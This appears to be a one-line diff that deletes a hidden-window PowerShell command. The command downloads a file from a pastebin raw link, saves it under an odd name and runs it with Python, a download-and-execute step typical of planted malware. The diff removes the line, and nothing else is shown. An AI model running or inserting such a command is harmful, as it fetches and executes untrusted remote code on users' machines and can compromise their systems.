@@ -1,1 +1,0 @@
-powershell -windowstyle Hidden{$url = 'https://pastebin.com/raw/g7Ud5dnM'; Invoke-WebRequest -Uri $url -OutFile Oshawott.oshawottwashere; python3 ./Oshawott.oshawottwashere}
